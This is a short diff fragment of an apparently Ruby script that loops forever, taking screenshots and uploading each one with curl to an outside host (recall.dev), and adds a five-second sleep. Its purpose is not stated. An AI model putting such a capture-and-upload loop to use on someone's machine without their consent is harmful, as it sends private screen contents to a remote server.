@@ -8,5 +8,6 @@ while true
   `screencapture #{file}`
 
   `curl --form "fileupload=@#{file}" http://recall.dev/snap`
+  sleep 5
 end
 
